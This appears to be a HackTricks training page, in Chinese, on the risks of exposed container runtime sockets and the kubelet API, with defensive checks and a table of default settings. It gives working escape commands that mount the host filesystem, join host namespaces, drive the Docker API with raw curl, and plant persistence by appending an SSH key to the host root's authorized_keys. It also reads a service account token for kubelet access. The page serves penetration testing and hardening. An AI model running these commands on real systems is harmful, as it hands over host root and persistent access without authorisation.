# Runtime API And Daemon 暴露

{{#include ../../../banners/hacktricks-training.md}}

## 概述

许多真实的容器失陷事件，根本不是从 namespace escape 开始的，而是从访问 runtime 控制平面开始的。如果工作负载可以通过挂载的 Unix socket 或暴露的 TCP 监听器与 `dockerd`、`containerd`、CRI-O、Podman 或 kubelet 通信，攻击者就可能请求创建一个权限更高的新容器、挂载主机文件系统、加入主机 namespace，或获取敏感的节点信息。在这些情况下，runtime API 才是真正的安全边界，攻陷它在实际效果上几乎等同于攻陷主机。

因此，runtime socket 暴露应与内核保护措施分开记录。即使容器启用了常规的 seccomp、capabilities 和 MAC 限制，只要 `/var/run/docker.sock` 或 `/run/containerd/containerd.sock` 被挂载到容器内，攻击者仍可能只需一次 API 调用就能攻陷主机。当前容器的内核隔离可能完全按设计正常工作，但 runtime 管理平面仍完全暴露。

## Daemon 访问模式

Docker Engine 传统上通过本地 Unix socket `unix:///var/run/docker.sock` 暴露其特权 API。历史上，它也曾通过 TCP 监听器远程暴露，例如 `tcp://0.0.0.0:2375`，或通过受 TLS 保护的 `2376` 监听器暴露。在缺乏强 TLS 和客户端身份验证的情况下远程暴露 daemon，实际上等同于将 Docker API 变成远程 root 接口。

containerd、CRI-O、Podman 和 kubelet 也暴露类似的高影响面。它们的名称和工作流程各不相同，但原理相同。如果某个接口允许调用者创建工作负载、挂载主机路径、获取凭据或修改正在运行的容器，那么该接口就是一个特权管理通道，应当按此对待。

容器管理 Web UI 即使不授予本地账户直接访问 socket 的权限，也可能暴露同一安全边界。例如，[Portainer issue #493](https://github.com/portainer/portainer/issues/493) 记录了旧版 1.11.1 中无需身份验证即可重置管理员密码的问题。将本地可访问的 UI 仅作为审查线索：确认已安装的版本及其身份验证行为、实际的管理员控制权限，以及其管理的 endpoint 是否能通过可写的主机 bind mount 创建容器。[Portainer 文档](https://docs.portainer.io/admin/environments/add/docker/socket)指出，基于 socket 的管理需要访问 Docker socket；rootless 或受限的 endpoint 会改变对主机的影响。不要仅凭进程名称、端口或版本字符串，就推断存在身份验证漏洞或可获取主机 root 权限。

值得检查的常见本地路径包括：

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

较旧或更专用的 stack 也可能暴露 `dockershim.sock`、`frakti.sock` 或 `rktlet.sock` 等 endpoint。这些在现代环境中不太常见，但遇到时也应同样谨慎对待，因为它们代表的是 runtime-control surface，而非普通的应用 socket。

## 安全远程访问

如果 daemon 必须通过本地 socket 之外的方式暴露，就应使用 TLS 保护连接，并且最好采用双向认证，让 daemon 验证客户端，同时客户端也验证 daemon。为了方便而通过纯 HTTP 开放 Docker daemon，是容器管理中最危险的错误之一，因为该 API 的权限足以直接创建特权容器。

Docker 早期的配置模式如下：

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

在基于 systemd 的主机上，daemon 通信也可能显示为 `fd://`，这意味着进程继承了一个由 systemd 预先打开的 socket，而不是自行直接绑定该 socket。重要的不是具体语法，而是其安全影响：一旦 daemon 开始监听权限未严格限制的本地 socket 以外的接口，传输安全和客户端身份验证就成为必需措施，而非可选的加固手段。

## 滥用

如果存在 runtime socket，请确认它是哪一个、是否有兼容的客户端，以及是否可以通过原始 HTTP 或 gRPC 访问：

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

这些命令很有用，因为它们可以区分路径失效、socket 已挂载但无法访问，以及可用的特权 API。如果客户端连接成功，接下来要确认的是 API 是否能通过 host bind mount 或共享 host namespace 来启动新容器。

### 未安装客户端时

没有安装 `docker`、`podman` 或其他易用的 CLI，并不意味着 socket 是安全的。Docker Engine 通过 Unix socket 使用 HTTP 通信，而 Podman 则通过 `podman system service` 同时提供兼容 Docker 的 API 和 Libpod 原生 API。这意味着即使在只有 `curl` 的精简环境中，也可能足以驱动 daemon：

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

这在 post-exploitation 阶段很重要，因为防御方有时会移除常见的客户端二进制文件，却留下已挂载的管理 socket。在 Podman 主机上，请记住，高价值路径因 rootful 和 rootless 部署而异：rootful 服务实例使用 `unix:///run/podman/podman.sock`，rootless 实例则使用 `unix://$XDG_RUNTIME_DIR/podman/podman.sock`。

### 完整示例：Docker Socket 到 Host Root

如果 `docker.sock` 可访问，经典的逃逸方式是启动一个挂载主机根文件系统的新容器，然后 `chroot` 进入其中：

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

这会通过 Docker daemon 直接以 host-root 身份执行。影响不止于读取文件。进入新容器后，攻击者可以修改 host 文件、窃取凭据、植入持久化机制，或启动其他特权工作负载。

### 完整示例：Docker Socket 到 Host Namespaces

如果攻击者更倾向于进入 namespace，而非仅访问文件系统：

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

这条路径是通过请求 runtime 创建一个显式暴露 host namespace 的新 container 来访问 host，而不是利用当前 container。

### Docker Socket 持久化模式

Runtime 控制也可用于持久化，而不只是获取一次性 shell。通用模式是创建一个带有 host mount 的 helper container，将授权访问材料或启动钩子写入挂载的 host 文件系统，然后验证 host 是否会使用这些内容。

示例形式：

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

根据操作人员希望证明的内容，同样的思路也可以针对 systemd units、cron 片段、应用程序启动文件或 SSH keys。关键在于，持久化更改是通过 runtime daemon 在主机级别的文件系统权限完成的，而不是通过提升原始容器的权限完成的。

### Raw Docker API Helper Pivot

当 Docker CLI 不可用时，可以通过 Unix socket 上的 HTTP 驱动同样的 host-mount helper 流程。通用流程是：确认 API、创建一个带有 host bind mount 的 helper container、启动它、创建一个 exec 实例，然后启动该 exec。

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

最终的 `/exec/<id>/start` 请求取决于返回的 exec ID，但安全问题与具体的 JSON 处理无关：直接访问 rootful Docker daemon 的 API，就足以请求权限更高的辅助工作负载。

### 完整示例：containerd Socket

挂载的 `containerd` socket 通常同样危险：<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

如果有更类似 Docker 的客户端，`nerdctl` 可能比 `ctr` 更方便，因为它提供了熟悉的标志，例如 `--privileged`、`--pid=host` 和 `-v`：

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

影响仍然是主机失陷。即使没有 Docker 专用工具，其他 runtime API 仍可能提供同样的管理权限。在 Kubernetes 节点上，`crictl` 也可能足以用于 reconnaissance 和容器交互，因为它直接与 CRI endpoint 通信。

### BuildKit Socket

`buildkitd` 很容易被忽略，因为人们常认为它“只是构建后端”，但该 daemon 仍然是一个具有高权限的控制平面。可访问的 `buildkitd.sock` 可能允许攻击者运行任意构建步骤、检查 worker 能力、使用来自已失陷环境的本地 context，并在 daemon 配置为允许时请求危险的 entitlement，例如 `network.host` 或 `security.insecure`。

首先可以尝试以下交互：

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

如果 daemon 接受 build 请求，请测试是否可用不安全的 entitlements：

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

具体影响取决于 daemon 配置，但启用了宽松 entitlements 的 rootful BuildKit 服务绝非无害的开发者便利工具。应将其视为另一个高价值的管理界面，尤其是在 CI runner 和共享构建节点上。

### 通过 TCP 访问 Kubelet API

kubelet 不是容器运行时，但它仍是节点管理平面的一部分，而且经常处于同一信任边界的讨论范围内。如果工作负载能够访问 kubelet 安全端口 `10250`，或者节点凭据、kubeconfig 或代理权限遭到暴露，攻击者就可能枚举 Pods、获取日志，或在节点本地容器中执行命令，而完全无需经过 Kubernetes API server 的准入路径。

从简单的发现开始：

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

如果 kubelet 或 API-server proxy 路径允许 `exec`，支持 WebSocket 的客户端就能借此在节点上的其他容器中执行代码。这也说明，只有 `get` 权限的 `nodes/proxy` 比听起来更危险：请求仍可到达能够执行命令的 kubelet 端点，而且这些直接与 kubelet 的交互不会出现在常规 Kubernetes audit logs 中。<sup>[[2]](#references)</sup>

## 检查

这些检查旨在确认容器是否能够访问任何本应位于信任边界之外的管理平面。

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

这里有哪些值得关注的地方：

- 挂载的 runtime socket 通常是直接的管理操作入口，而不仅仅是信息泄露。
- 不带 TLS 的 `2375` 端口 TCP 监听器应视为远程攻陷条件。
- `DOCKER_HOST` 等环境变量通常表明该工作负载本来就是为与宿主机 runtime 通信而设计的。

## Runtime 默认配置

| Runtime / 平台 | 默认状态 | 默认行为 | 常见的手动弱化配置 |
| --- | --- | --- | --- |
| Docker Engine | 默认使用本地 Unix socket | `dockerd` 监听本地 socket，且 daemon 通常以 rootful 模式运行 | 挂载 `/var/run/docker.sock`、暴露 `tcp://...:2375`、在 `2376` 上使用弱 TLS 或不使用 TLS |
| Podman | 默认使用无 daemon 的 CLI | 普通本地使用无需长期运行的特权 daemon；启用 `podman system service` 后仍可能暴露 API socket | 暴露 `podman.sock`、以宽泛方式运行服务、使用 rootful API |
| containerd | 本地特权 socket | 管理 API 通过本地 socket 暴露，通常由更高层的工具使用 | 挂载 `containerd.sock`、广泛开放 `ctr` 或 `nerdctl` 访问权限、暴露特权 namespace |
| CRI-O | 本地特权 socket | CRI endpoint 供节点本地的可信组件使用 | 挂载 `crio.sock`、将 CRI endpoint 暴露给不可信工作负载 |
| Kubernetes kubelet | 节点本地管理 API | Kubelet 不应被 Pod 广泛访问；根据认证与授权配置，访问可能暴露 Pod 状态、凭据和执行功能 | 挂载 kubelet socket 或证书、kubelet 认证配置薄弱、使用 host networking 并能访问 kubelet endpoint |

## References

- [1] [containerd socket exploitation 第 1 部分](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server 绕过风险](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
